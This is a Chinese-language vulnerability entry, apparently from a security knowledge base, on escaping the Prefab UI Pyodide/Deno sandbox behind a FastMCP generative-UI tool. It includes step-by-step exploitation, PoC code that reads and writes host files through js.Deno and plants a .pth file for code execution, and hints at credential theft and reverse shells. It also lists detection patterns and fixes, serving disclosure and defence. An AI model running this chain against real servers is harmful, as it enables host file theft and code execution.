---
id: ai-security-agent-security-prefab-ui-pyodide-deno-host-file-escape
title: Prefab UI Pyodide 沙箱经 js.Deno 桥接越权读写宿主文件并落 .pth 实现后续 RCE（CVE-2026-120338）
type: scenario
domain: ai-security
path: ai-security/agent-security
technique: pyodide-js-bridge-deno-host-file-access
tags:
- ai-security
- prefab-ui
- pyodide
- deno
- wasm
- sandbox
- host-file-access
- cve-2026-120338
- mcp
- fastmcp
- pth
cve:
- CVE-2026-120338
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
affected_versions: prefab-ui >=0.14.0, <0.21.0（公开验证 0.20.2，修复 0.21.0）
verification:
  verified_by: verifier-V138
  verified_at: '2026-11-06T05:42:35+08:00'
  notes: 已对照原文及39张截图核对：FastMCP GenerativeUI→generate_prefab_ui→PyodideSandbox→Deno 子进程（--allow-read/--allow-write/--allow-net），VFS 与 js.Deno 双路径、宿主读/写成功、ps 进程参数、.pth 写入后新解释器触发 Calculator、0.21.0 revoke read/write/net + --no-prompt + --allow-net=cdn.jsdelivr.net:443 及 NotCapable 拒绝均一致；版本已按原文设置 >=0.14.0,<0.21.0。未验证点：原文复现于 macOS/Python 3.11/Deno 2.9.8，未复跑 PoC。
url: /docs/ai-security/agent-security/ai-security-agent-security-prefab-ui-pyodide-deno-host-file-escape/
draft: false
kb_aliases:
- CVE-2026-120338
- prefab-ui
- Prefab UI 沙箱越权
- PyodideSandbox
- js.Deno
- generate_prefab_ui
- Deno 权限撤销
- 生成式 UI 宿主文件访问
---

## 一句话结论

Prefab UI 0.14.0 至 0.20.x 的 `PyodideSandbox` 由 Python 服务启动 Deno 子进程承载 Pyodide；Deno 为可信初始化申请的 `--allow-read`/`--allow-write`/`--allow-net` 在初始化完成后、执行模型生成的不可信 Python 代码前没有撤销，Pyodide 的 `js` 桥接又暴露了 `Deno` 全局对象，于是不可信代码可用 `js.Deno.readTextFileSync()/writeTextFileSync()` 直接读写宿主文件；若可写目标 Python 环境的 `site-packages`，还能落 `.pth` 在后续解释器启动时执行代码（CVE-2026-120338，0.21.0 修复）。

## 原理

- **执行链**：FastMCP 的 `GenerativeUI` Provider 注册 `generate_prefab_ui(code)` 工具 → `prefab_ui.generative.execute()` → `Sandbox`/`PyodideSandbox` → `subprocess.Popen(["deno","run","--allow-read","--allow-write","--allow-net", "runner.js", prefab_src])` → `runner.js` 加载 Pyodide，并用 `pyodide.runPythonAsync()` 执行 Python Harness 里的 `exec(_code, _ns)`。
- **两条文件路径**：Python 的 `open()`/`pathlib` 走 Emscripten 虚拟文件系统（VFS），同名路径不会落到宿主；`import js` 取得 JavaScript 全局对象后，`js.Deno.readTextFileSync()`/`writeTextFileSync()` 调用 Deno 原生文件 API，直接作用于 Deno 进程可见的宿主文件系统。
- **权限模型**：Deno 的 `--allow-read`、`--allow-write`、`--allow-net` 是运行时权限检查，不带路径/目标时不受特定目录限制；但仍受 Deno 进程所属系统账户、文件所有权与操作系统访问控制约束，因此不等于系统提权或容器逃逸。
- **根因**：Deno 启动时授予的权限用于可信初始化（加载 Pyodide、读取 Prefab 源码、写缓存），但旧版 `runner.js` 在输出 `pyodide:ready` 之前没有调用 `Deno.permissions.revoke()`；父进程看到就绪信号后即开始把外部请求交给该执行器，不可信代码因此继承了初始化阶段的宿主能力。
- **为什么桥接能生效**：Pyodide 的 VFS 只约束 Python 文件 API，`js` 互操作是设计能力，直接把 Deno 全局对象暴露给 Python；真正的安全边界应是外层 Deno 运行时权限，而该权限跨过了“可信初始化 → 不可信代码执行”的信任边界。
- **危害**：Deno 进程可读应用配置、缓存、工作目录及服务账户可访问的凭据/令牌，并通过生成的 UI 组件回显；写入可修改应用目录、缓存、可加载配置文件；进一步向目标 Python 环境的 `site-packages` 写 `.pth`，可在后续 Python 进程启动时执行代码。

## 触发条件

- 服务端启用了 Prefab UI 的 Generative UI 功能（如 FastMCP 中 `mcp.add_provider(GenerativeUI())`），并安装 Deno，使外部提交的 Python 代码进入受影响的 Pyodide 执行器。
- 攻击者能调用 `generate_prefab_ui` MCP 工具：未配置认证的 FastMCP 服务可直接调用；配置认证时需具备对应工具调用权限。
- 受影响版本 `prefab-ui >=0.14.0, <0.21.0`；文章公开验证 0.20.2（Python 3.11、Deno 2.9.8、FastMCP 4.1.6）。
- Deno 以未限定路径的 `--allow-read`/`--allow-write` 启动（0.20.2 默认如此），实际可读写范围由运行账户权限决定。
- 链尾 `.pth` 代码执行另需：Deno 账户对目标 `site-packages` 有写权限；目标 `.pth` 位于后续解释器实际处理的加载路径；写入后存在该解释器启动过程。

## 利用步骤

1. 连接 FastMCP HTTP 端点（文章为 `http://127.0.0.1:8127/mcp/`），`list_tools()` 确认存在 `generate_prefab_ui`。
2. 提交只调用 Python 文件 API 的对照代码（如 `Path("/tmp/x").write_text(...)`），在宿主检查同名文件不存在，确认 VFS 边界。
3. 提交 `import js; js.Deno.readTextFileSync("<宿主文件>")` 的代码，观察返回的 Prefab 组件内容包含宿主文件文本，确认宿主读取越权。
4. 提交 `js.Deno.writeTextFileSync("<宿主路径>", "<内容>")`，在宿主检查文件出现且内容一致，确认宿主写入越权。
5. 检查 Deno 进程启动参数与运行身份：`ps -ww -o pid,ppid,user,group,args -p "$(pgrep -f 'prefab_ui/sandbox/runner.js')"`，确认存在未限定路径的 `--allow-read/--allow-write/--allow-net`。
6. 链尾 RCE：确定目标 Python 环境的 `purelib` 路径（`python -c 'import sysconfig; print(sysconfig.get_path("purelib"))'`），通过 `js.Deno.writeTextFileSync()` 写入 `.pth`（内容为 `import subprocess; subprocess.Popen([...])`），再启动该环境的解释器，确认 `.pth` 中的代码被执行。
7. 授权测试中用无害标记文件与计算器等无害载荷；真实评估可替换为读取配置/凭据、反弹 shell 或持久化。

## PoC

服务端（FastMCP + GenerativeUI）：

```python
from fastmcp import FastMCP
from fastmcp.apps.generative import GenerativeUI

mcp = FastMCP("prefab-security-lab")
mcp.add_provider(GenerativeUI())

if __name__ == "__main__":
    mcp.run(transport="http", host="127.0.0.1", port=8127)
```

通过 MCP 工具提交的宿主读取代码：

```python
import js
from prefab_ui.components import Text

content = js.Deno.readTextFileSync("/tmp/prefab-lab-host-source.txt")
view = Text("HOST_READ:" + str(content).strip())
```

宿主写入代码：

```python
import js
from prefab_ui.components import Text

js.Deno.writeTextFileSync(
    "/tmp/prefab-lab-host-written.txt",
    "HOST_WRITE_OK"
)
view = Text("HOST_WRITE_REQUESTED")
```

链尾 `.pth` 写入（随后启动目标解释器触发）：

```python
import js
from prefab_ui.components import Text

js.Deno.writeTextFileSync(
    "/tmp/prefab-pth-lab/lib/python3.11/site-packages/prefab_lab.pth",
    'import subprocess; subprocess.Popen(["open", "-a", "Calculator"])\n'
)
view = Text("PTH_WRITE_REQUESTED")
```

MCP 调用可用 `fastmcp.Client` 的 `call_tool("generate_prefab_ui", {"code": <上述代码>})`；文章完整客户端还先 `list_tools()` 校验工具存在。

## 变体与关联

- **读取变体**：读取应用配置、环境变量文件、缓存、工作目录、SSH/云凭据等 Deno 账户可访问的文件；结果可通过 `Text`/表格等 UI 组件回显，或写入攻击者可控路径。
- **写入变体**：修改应用配置、缓存、模板、可被可信程序加载的脚本；写入 `.pth`/`sitecustomize.py` 形成后续解释器启动时的代码执行。
- **网络能力**：同一进程还持有 `--allow-net`，不可信代码可经 `js.Deno` 发起出站连接（SSRF、数据外带），范围受 Deno 权限与网络策略约束。
- **修复对比（0.21.0）**：`runner.js` 在 Pyodide 初始化与 Harness 加载完成后、输出 `pyodide:ready` 之前，对 `read`/`write`/`net` 调用 `Deno.permissions.revoke()`；`_pyodide.py` 增加 `--no-prompt`（禁止运行期交互式重新授权）、`--allow-net=cdn.jsdelivr.net:443`（收窄初始化网络目标）、`--lock/--frozen/--no-config`；启动阶段仍保留 `--allow-read/--allow-write`，因为初始化需要。
- **关联**：[[web-python-sandbox-site-packages-pth-sitecustomize-escape]]（任意文件写 → `.pth`/`sitecustomize` 沙箱逃逸）、[[pentest-persistence-python-pth-sitepackages-autoload]]（`.pth` 启动持久化）、[[ai-security-agent-security-dify-code-sandbox-network-egress]]（AI 代码沙箱网络能力默认开启）、[[ai-security-agent-security-prompt-injection-force-sandbox-vm2-escape]]（Agent 沙箱逃逸链）。

## 检测与防御

- **检测**：MCP 工具调用参数中出现 `import js`、`js.Deno`、`readTextFileSync`、`writeTextFileSync`、`.pth`、`sitecustomize`、`subprocess` 等模式；Deno 子进程启动参数含未限定路径的 `--allow-read/--allow-write`；Pyodide 执行器产生对宿主路径的异常文件访问；`site-packages` 出现新建 `.pth`/`sitecustomize.py`；Deno 进程拉起计算器、shell 等非预期子进程。
- **防御（组件）**：升级 `prefab-ui` 到 >=0.21.0；在初始化完成、接收不可信代码前撤销 Deno 的 read/write/net 权限；启动参数用路径级白名单限制 `--allow-read/--allow-write`，用 `--allow-net=<目标>` 收窄网络，启用 `--no-prompt` 禁止运行期重新授权。
- **防御（部署）**：Deno/Pyodide 执行器使用最小权限系统账户运行，隔离工作目录；不要把生产凭据、可执行程序加载目录（`site-packages` 等）放在执行器可写范围内；对 MCP 工具做认证/授权与调用审计；无法升级时停止向不可信调用方开放 Generative UI 代码执行工具。
- **边界**：该漏洞本身是宿主文件访问越权，实际影响受操作系统权限约束；链尾 RCE 依赖可写且会被后续解释器加载的路径，报告时需区分“宿主读写”与“已实现代码执行”。
